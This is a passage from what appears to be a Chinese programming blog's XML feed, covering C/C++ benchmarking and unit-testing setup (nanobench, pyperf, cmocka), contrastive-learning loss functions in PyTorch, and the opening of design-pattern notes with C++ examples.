class="hljs-built_in">cout</span> &lt;&lt; bench.complexityBigO() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/RacleRay/image_storage@main/image/image-20230805105636829.1u33qqj9hbvk.png" srcset="/img/loading.gif" lazyload></p><p>可使用 pyperf 解析结果：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DOCTEST_CONFIG_IMPLEMENT_WITH_MAIN</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;doctest.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;nanobench.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fstream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;atomic&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;random&gt;</span></span><br><br>TEST_CASE(<span class="hljs-string">"shuffle_pyperf"</span>) &#123;<br>  <span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">uint64_t</span>&gt; <span class="hljs-title">data</span><span class="hljs-params">(<span class="hljs-number">500</span>, <span class="hljs-number">0</span>)</span></span>; <span class="hljs-comment">// input data for shuffling</span><br><br>  <span class="hljs-comment">// NOLINTNEXTLINE(cert-msc32-c,cert-msc51-cpp)</span><br>  <span class="hljs-function"><span class="hljs-built_in">std</span>::default_random_engine <span class="hljs-title">defaultRng</span><span class="hljs-params">(<span class="hljs-number">123</span>)</span></span>;<br>  <span class="hljs-function"><span class="hljs-built_in">std</span>::ofstream <span class="hljs-title">fout1</span><span class="hljs-params">(<span class="hljs-string">"pyperf_shuffle_std.json"</span>)</span></span>;<br>  ankerl::nanobench::Bench()<br>      .epochs(<span class="hljs-number">100</span>)<br>      .<span class="hljs-built_in">run</span>(<span class="hljs-string">"std::shuffle with std::default_random_engine"</span>,<br>           [&amp;]() &#123; <span class="hljs-built_in">std</span>::shuffle(data.<span class="hljs-built_in">begin</span>(), data.<span class="hljs-built_in">end</span>(), defaultRng); &#125;)<br>      .render(ankerl::nanobench::templates::pyperf(), fout1);<br><br>  <span class="hljs-function"><span class="hljs-built_in">std</span>::ofstream <span class="hljs-title">fout2</span><span class="hljs-params">(<span class="hljs-string">"pyperf_shuffle_nanobench.json"</span>)</span></span>;<br>  ankerl::<span class="hljs-function">nanobench::Rng <span class="hljs-title">rng</span><span class="hljs-params">(<span class="hljs-number">123</span>)</span></span>;<br>  ankerl::nanobench::Bench()<br>      .epochs(<span class="hljs-number">100</span>)<br>      .<span class="hljs-built_in">run</span>(<span class="hljs-string">"ankerl::nanobench::Rng::shuffle"</span>, [&amp;]() &#123; rng.shuffle(data); &#125;)<br>      .render(ankerl::nanobench::templates::pyperf(), fout2);<br>&#125;<br></code></pre></div></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">python3 -m pyperf stats pyperf_shuffle_std.json<br></code></pre></div></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/RacleRay/image_storage@main/image/image-20230805105917015.34t2dn71p5u0.jpg" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p><img src="https://cdn.jsdelivr.net/gh/RacleRay/image_storage@main/image/image-20230805105932668.3arwx8ta0ta0.jpg" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><h2><span id="cmocka">cmocka</span></h2><p><a href="https://api.cmocka.org/" target="_blank" rel="noopener">API</a>文档。但是建议结合 <a href="https://git.cryptomilk.org/projects/cmocka.git/">source code</a>中的示例程序，了解 cmocka 的使用。</p><p>项目下新建文件夹 cmocka ，添加以下 .cmake 文件：</p><figure class="highlight cmake"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmake"><span class="hljs-keyword">include</span>(FetchContent)<br><br>FetchContent_Declare(<br>  cmocka<br>  GIT_REPOSITORY https://git.cryptomilk.org/projects/cmocka.git<br>  GIT_TAG        cmocka-<span class="hljs-number">1.1</span>.<span class="hljs-number">7</span><br>  GIT_SHALLOW    <span class="hljs-number">1</span><br>)<br><br><span class="hljs-keyword">set</span>(WITH_STATIC_LIB <span class="hljs-keyword">ON</span> CACHE BOOL <span class="hljs-string">"CMocka: Build with a static library"</span> FORCE)<br><span class="hljs-keyword">set</span>(WITH_CMOCKERY_SUPPORT <span class="hljs-keyword">OFF</span> CACHE BOOL <span class="hljs-string">"CMocka: Install a cmockery header"</span> FORCE)<br><span class="hljs-keyword">set</span>(WITH_EXAMPLES <span class="hljs-keyword">OFF</span> CACHE BOOL <span class="hljs-string">"CMocka: Build examples"</span> FORCE)<br><span class="hljs-keyword">set</span>(UNIT_TESTING <span class="hljs-keyword">ON</span> CACHE BOOL <span class="hljs-string">"CMocka: Build with unit testing"</span> FORCE)<br><span class="hljs-keyword">set</span>(PICKY_DEVELOPER <span class="hljs-keyword">OFF</span> CACHE BOOL <span class="hljs-string">"CMocka: Build with picky developer flags"</span> FORCE)<br><br>FetchContent_MakeAvailable(cmocka)<br></code></pre></div></td></tr></table></figure><p>项目根目录下的 CMakeLists.txt 中：</p><figure class="highlight cmake"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmake"><span class="hljs-keyword">include</span>(cmake/FetchCMocka.cmake)<br><br><span class="hljs-comment"># 添加编译目标</span><br><span class="hljs-keyword">add_executable</span>(CMockaExample <span class="hljs-keyword">test</span>.c)<br><span class="hljs-keyword">target_compile_features</span>(CMockaExample PRIVATE c_std_99)<br><span class="hljs-keyword">target_link_libraries</span>(CMockaExample PRIVATE cmocka-static)<br><br><span class="hljs-keyword">enable_testing</span>()<br><span class="hljs-keyword">add_test</span>(NAME CMockaExample <span class="hljs-keyword">COMMAND</span> CMockaExample)<br></code></pre></div></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdarg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;setjmp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cmocka.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">(<span class="hljs-keyword">void</span> **state)</span></span><br><span class="hljs-function"></span>&#123;<br>    assert_int_equal(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">CMUnitTest</span> <span class="hljs-title">tests</span>[] =</span><br><span class="hljs-class">    &#123;</span><br>        cmocka_unit_test(test),<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> cmocka_run_group_tests(tests, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/RacleRay/image_storage@main/image/image-20230806160220120.51hat6ug9rw0.jpg" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
          <category> C </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> C++ </tag>
            
            <tag> 测试框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对比学习损失使用</title>
      <link href="/posts/39bd8d48.html"/>
      <url>/posts/39bd8d48.html</url>
      
        <content type="html"><![CDATA[<p>对于自监督学习，一般分为两种。一种是AutoEncoder这种通过一个表征向量，从自己到自己的还原过程，这类称为生成式自监督学习。一种是以学习区分两种不同类事物的关键特征为目标，通过构建正负例子，学习表征向量的方法，这类称为判别式自监督学习，也叫做对比学习。</p><p>对比学习的通过互信息，衡量一个表征的好坏，与正例相似而远离负例。这里记录两个常用的对比学习损失。</p><h2><span id="ntxentloss">NTXentLoss</span></h2><p>NTXentLoss也就是InfoNCE使用的损失： <span class="math display">\[L = -log \frac{exp(q \cdot k_+ / \tau)}{\sum^{K}_{i=0}exp(q \cdot k_i /\tau)}\]</span> 分子在最小化损失函数时，会使表征 <span class="math inline">\(q\)</span> 与正例 <span class="math inline">\(k_+\)</span> 的相似度增加。</p><p>可以直接使用 <a href="https://kevinmusgrave.github.io/pytorch-metric-learning/">PyTorchMetric Learning</a> 包调用损失函数类。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pytorch_metric_learning.losses <span class="hljs-keyword">import</span> NTXentLoss<br><br>...<br>loss_func = NTXentLoss(temperature=temperature)<br>...<br></code></pre></div></td></tr></table></figure><p>其基本流程如下：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">for</span> anchor, positive <span class="hljs-keyword">in</span> pos_pairs:<br>    numerator = torch.exp(torch.matmul(anchor, positive) / (temperature * torch.norm(anchor) * torch.norm(positive)))<br>    denominator = numerator.clone()<br>    <br>    <span class="hljs-keyword">for</span> (candidate, negetive) <span class="hljs-keyword">in</span> neg_pairs:<br>        tmp = torch.exp(torch.matmul(anchor, negative) / (temperature * torch.norm(anchor) * torch.norm(negative)))<br>        denominator += tmp<br>     <br>    total_loss += -torch.log(numerator / denominator)<br></code></pre></div></td></tr></table></figure><h2><span id="supconloss">SupConLoss</span></h2><p>SupConLoss（SupervisedContrastive）是在监督数据中使用对比学习的损失函数。由于有监督数据的支撑，正例不再来源于样本自身，而且可以来自监督标签中属于同一类的样本。其计算公式的区别也在于多了监督标签的部分。<span class="math display">\[L^{sup}= \sum_{i \in I} \frac{-1}{|P(i)|} \sum_{p \in P(i)} log\frac{exp(z_p \cdot z_i / \tau)}{ \sum_{a \in A(i)} exp(z_a \cdot z_i /\tau)}\]</span> 对每个正例除以包含该正例的positivepairs的数量。具体看代码比较直接。这个公式有两种形式，还有一种是将对<span class="math inline">\(|P(i)|\)</span> 求平均的操作放置于 log之内。</p><p>可以直接使用 <a href="https://kevinmusgrave.github.io/pytorch-metric-learning/">PyTorchMetric Learning</a> 包调用损失函数类。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pytorch_metric_learning.losses <span class="hljs-keyword">import</span> SupConLoss<br><br>loss_func = SupConLoss(temperature=temperature)<br></code></pre></div></td></tr></table></figure><p>其基本流程如下：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">losses = torch.zeros(num_of_classes, dtype=torch.float64)<br><br><span class="hljs-keyword">for</span> anchor, positive <span class="hljs-keyword">in</span> pos_pairs:<br>    numerator = torch.exp(torch.matmul(anchor, positive) / (temperature * torch.norm(anchor) * torch.norm(positive)))<br>    denominator = numerator.clone()<br>    <br>    <span class="hljs-keyword">for</span> (candidate, negetive) <span class="hljs-keyword">in</span> neg_pairs:<br>        tmp = torch.exp(torch.matmul(anchor, negative) / (temperature * torch.norm(anchor) * torch.norm(negative)))<br>        denominator += tmp<br>     <br>    losses[anchor_idx] += -torch.log(numerator / denominator)<br><br><br>total_loss = torch.mean(losses / num_of_positive_pairs_per_anchor)<br></code></pre></div></td></tr></table></figure><h3><span id="gather操作">Gather操作</span></h3><p>和之前主题无关，只是记在一起。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">output = tensor.gather(dim, index)<br></code></pre></div></td></tr></table></figure><p>tensor与index是两个维度相同的张量。</p><p>output中的下标为 (i, j) 的值来自：</p><blockquote><p>dim = 0，从tensor中取值时，0维的坐标值来自index张量的 (i, j)位置的值，1维的坐标值就是 j （output中本来的坐标值）。</p><p>dim = 1，从tensor中取值时，1维的坐标值来自index张量的 (i, j)位置的值，0维的坐标值就是 i （output中本来的坐标值）。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> deep learning </tag>
            
            <tag> contrastive learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>设计模式Notes</title>
      <link href="/posts/97f88c07.html"/>
      <url>/posts/97f88c07.html</url>
      
        <content type="html"><![CDATA[<p>计算机科学中有两种思考方式：</p><p>底层思维：向下，把握机器底层从微观理解对象构造。</p><p>抽象思维：向上，将问题处理过程抽象为程序代码。</p><p>设计模式通过抽象，分离职责，提高复用性。</p><h2><span id="第一个示例">第一个示例</span></h2><p>绘制点或者线，实现方式一，点是点，线是线。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Point</span> &#123;</span>...&#125;;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Line</span> &#123;</span>...&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainForm</span> :</span> <span class="hljs-keyword">public</span> Form &#123;<br>    ...;<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-built_in">vector</span>&lt;Line&gt; lineVector;<br>    <span class="hljs-built_in">vector</span>&lt;Rect&gt; rectVector;<br><span class="hljs-keyword">protected</span>:<br>...<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">OnMouseUp</span><span class="hljs-params">(<span class="hljs-keyword">const</span> MouseEventArgs&amp; e)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">OnPaint</span><span class="hljs-params">(<span class="hljs-keyword">const</span> PaintEventArgs&amp; e)</span></span>;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">MainForm::OnMouseUp</span><span class="hljs-params">(<span class="hljs-keyword">const</span> MouseEventArgs&amp; e)</span></span>&#123;<br><span class="hljs-comment">// Point处理代码</span><br>    ...;<br>    <span class="hljs-comment">// Line处理代码</span><br>    ...;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">MainForm::OnPaint</span><span class="hljs-params">(<span class="hljs-keyword">const</span> PaintEventArgs&amp; e)</span></span>&#123;<br>    <span class="hljs-comment">// Point处理代码</span><br>    ...;<br>    <span class="hljs-comment">// Line处理代码</span><br>    ...;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>方式二，抽象出Shape基类，在MainForm中统一接口调用。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Shape</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Draw</span><span class="hljs-params">(<span class="hljs-keyword">const</span> Graphics&amp; g)</span></span>=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">virtual</span> ~Shape() &#123; &#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Point</span>:</span> <span class="hljs-keyword">public</span> Shape&#123;<br>    <span class="hljs-comment">// 画点</span><br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Draw</span><span class="hljs-params">(<span class="hljs-keyword">const</span> Graphics&amp; g)</span></span>&#123;<br>        ...<br>    &#125;;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Line</span>:</span> <span class="hljs-keyword">public</span> Shape&#123;<br>    <span class="hljs-comment">// 画线</span><br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Draw</span><span class="hljs-params">(<span class="hljs-keyword">const</span> Graphics&amp; g)</span></span>&#123;<br>        ...<br>    &#125;;<br>&#125;;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainForm</span> :</span> <span class="hljs-keyword">public</span> Form &#123;<br>    ...;<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-comment">// 抽象</span><br>    <span class="hljs-built_in">vector</span>&lt;Shape *&gt; shapes;<br><span class="hljs-keyword">protected</span>:<br>...<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">OnMouseUp</span><span class="hljs-params">(<span class="hljs-keyword">const</span> MouseEventArgs&amp; e)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">OnPaint</span><span class="hljs-params">(<span class="hljs-keyword">const</span> PaintEventArgs&amp; e)</span></span>;<br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">MainForm::OnMouseUp</span><span class="hljs-params">(<span class="hljs-keyword">const</span> MouseEventArgs&amp; e)</span></span>&#123;<br><span class="hljs-comment">// Shape处理代码</span><br>    ...;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">MainForm::OnPaint</span><span class="hljs-params">(<span class="hljs-keyword">const</span> PaintEventArgs&amp; e)</span></span>&#123;<br>    <span class="hljs-comment">// Shape处理代码</span><br>    ...;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; shapes.<span class="hljs-built_in">size</span>(); i++)&#123;<br>shapes[i]-&gt;Draw(e.Graphics); <span class="hljs-comment">//多态调用</span><br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2><span id="概念">概念</span></h2><p>设计模式要解决的能解决的问题，是程序同时有“稳定不变的部分”和“可能发生变化的部分”时，如何提高代码重用性。目标是将变化的部分规约到一起，并使扩展功能变得容易一些。如果只有稳定的部分，不需要设计模式。如果全是变化的部分，使用设计模式并不能到达目的。</p><h3><span id="面向对象的理解">面向对象的理解</span></h3><ul><li><p>隔离变化从宏观层面来看，面向对象的构建方式更能适应软件的变化，能将变化所带来的影响减为最小</p></li><li><p>各司其职</p><ol type="1"><li>从微观层面来看，面向对象的方式更强调各个类的“责任”</li><li>由于需求变化导致的新增类型不应该影响原来类型的实现——是所谓各负其责</li></ol></li><li><p>对象是什么</p><ol type="1"><li>从语言实现层面来看，对象封装了代码和数据。</li><li>从规格层面讲，对象是一系列可被使用的公共接口。</li><li>从概念层面讲，对象是某种拥有责任的抽象。</li></ol></li></ul><h3><span id="一般术语的含义">一般术语的含义</span></h3><ol type="1"><li>运行时：程序已经被编译，加载到内存中的二进制形式。</li><li>扩展：一般来讲，就是建立新的子类，override父类中提供变化的接口方法。</li><li>稳定：一般指代码被编译成二进制之后，不会再改变（或者说很少改变）。不是说一个代码文件中，没有改变的代码片段。</li><li>变化：一般时程序中，会随着需求、场景、时间等频繁切换或者改变。这部分会经常要求重新编译。</li><li>不可修改：一般就是指源代码不会更改。</li><li>接口：一个类（抽象基类）对外开放的方法，一般会有统一的设计准则。</li><li>绑定：一般就是指调用关系，一个类中的方法会调用到另一个类中的方法实现。类间可以为父子关系。</li></ol><h3><span id="原则">原则</span></h3><ol type="1"><li><p>依赖倒置原则（DIP）</p><ul><li>高层模块(稳定)不应该依赖于低层模块(变化)，二者都应该依赖于抽象(稳定)。</li><li>抽象(稳定)不应该依赖于实现细节(变化)，实现细节应该依赖于抽象(稳定)。</li></ul></li><li><p>开放封闭原则（OCP）</p><ul><li>对扩展开放，对更改封闭</li><li>类模块应该是可扩展的，但是不可修改</li></ul></li><li><p>单一职责原则（SRP）</p><ul><li><p>一个类应该仅有一个引起它变化的原因</p></li><li><p>变化的方向隐含着类的责任</p></li></ul></li><li><p>Liskov 替换原则（LSP）</p><ul><li>子类必须能够替换它们的基类(IS-A)</li><li>继承表达类型抽象</li></ul></li><li><p>接口隔离原则（ISP）</p><ul><li>不应该强迫客户程序依赖它们不用的方法</li><li>接口应该小而完备</li></ul></li><li><p>优先使用对象组合，而不是类继承</p><ul><li>类继承通常为“白箱复用”，对象组合通常为“黑箱复用”</li><li>继承在某种程度上破坏了封装性，子类父类耦合度高</li><li>而对象组合则只要求被组合的对象具有良好定义的接口，耦合度低</li></ul></li><li><p>封装变化点</p><ul><li>使用封装来创建对象之间的分界层，让设计者可以在分界层的一侧进行修改，而不会对另一侧产生不良的影响，从而实现层次间的松耦合。</li></ul></li><li><p>针对接口编程，而不是针对实现编程</p><ul><li>不将变量类型声明为某个特定的具体类，而是声明为某个接口</li><li>客户程序无需获知对象的具体类型，只需要知道对象所具有的接口</li><li>减少系统中各部分的依赖关系，从而实现“高内聚、松耦合”的类型设计方案</li></ul></li></ol><p>很抽象的总结，结合具体模式体会。</p><h3><span id="分类">分类</span></h3><p>从目的来看：</p><ol type="1"><li>创建型（Creational）模式：将对象的部分创建工作延迟到子类或者其他对象，从而应对需求变化为对象创建时具体类型实现引来的冲击。</li><li>结构型（Structural）模式：通过类继承或者对象组合获得更灵活的结构，从而应对需求变化为对象的结构带来的冲击。</li><li>行为型（Behavioral）模式：通过类继承或者对象组合来划分类与对象间的职责，从而应对需求变化为多个交互的对象带来的冲击。</li></ol><p>从范围来看：</p><ol type="1"><li>类模式处理类与子类的静态关系。</li><li>对象模式处理对象间的动态关系。</li></ol><p>从封装变化角度对模式分类：</p><ol type="1"><li>组件协作： • Template Method • Observer / Event • Strategy</li><li>单一职责： • Decorator • Bridge</li><li>对象创建: • Factory Method • Abstract Factory • Prototype •Builder</li><li>对象性能： • Singleton • Flyweight</li><li>接口隔离: • Façade • Proxy • Mediator • Adapter</li><li>状态变化： • Memento • State</li><li>数据结构： • Composite • Iterator • Chain of Responsibility</li><li>行为变化： • Command • Visitor</li><li>领域问题： • Interpreter</li></ol><p>现代软件设计的特征是“需求的频繁变化”。设计模式的要点是“寻找变化点，然后在变化点处应用设计模式，从而来更好地应对需求的变化”。“什么时候、什么地点应用设计模式”比“理解设计模式结构本身”更为重要。</p><p>设计模式的应用不宜先入为主，一上来就使用设计模式是对设计模式的最大误用。没有一步到位的设计模式。敏捷软件开发实践提倡的“<strong>Refactoringto Patterns</strong>”是目前普遍公认的最好的使用设计模式的方法。</p><h3><span id="重构技法">重构技法</span></h3><ul><li>静态 转 动态</li><li>早绑定 转 晚绑定</li><li>继承 转 组合</li><li>编译时依赖 转 运行时依赖</li><li>紧耦合 转 松耦合</li></ul><p>虽然表述上不同，但是实质上意思是类似的。</p><h2><span id="组件协作相关模式">组件协作相关模式</span></h2><p>现代软件专业分工之后的第一个结果是“框架与应用程序的划分”，“组件协作”模式通过<strong>晚绑定</strong>（父类中调用子类的方法实现，虚函数实现），来实现框架与应用程序之间的松耦合，是二者之间协作时常用的模式。</p><p>典型模式：</p><ul><li>Template Method</li><li>Observer / Event</li><li>Strategy</li></ul><h3><span id="template-method">Template Method</span></h3><p>对于某一项任务，它常常有稳定的整体操作结构，但各个子步骤却有很多改变的需求，或者由于固有的原因（比如框架与应用之间的关系）而无法和任务的整体结构同时实现。</p><p>在确定稳定操作结构的前提下，来灵活应对各个子步骤的变化或者晚期实现需求。</p><h4><span id="示例2">示例2</span></h4><p>设计一个library，支持application在使用时可以自定义框架中的某些步骤。</p><p>实现一，Application实现过程还需要完成main函数中调用library，并完成算法逻辑的过程。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs 